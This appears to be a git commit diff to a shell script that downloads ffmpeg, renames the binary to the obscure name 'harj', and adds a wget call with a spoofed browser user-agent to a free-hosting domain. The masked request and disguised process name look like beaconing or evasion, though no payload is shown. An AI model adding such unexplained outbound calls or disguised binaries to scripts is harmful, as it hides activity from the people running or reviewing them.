68024245aa436aa2cc794c0d3b7f5ef95cfa199b
epl <me@example.com>
2022-07-27 08:35:28 +0200

    auto

--- run.sh
+++ run.sh
@@ -3,3 +3,4 @@ tar xf ffmpeg-master-latest-linux64-gpl.tar.xz
 rm -v ffmpeg-master-latest-linux64-gpl.tar.xz
 cd ffmpeg* && mv -vf  bin/ffmpeg ../harj&&chmod a+x ../harj
 cd .. && rm -rf ffmpeg*
+wget -U "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 S" http://urquioora.ezyro.com/
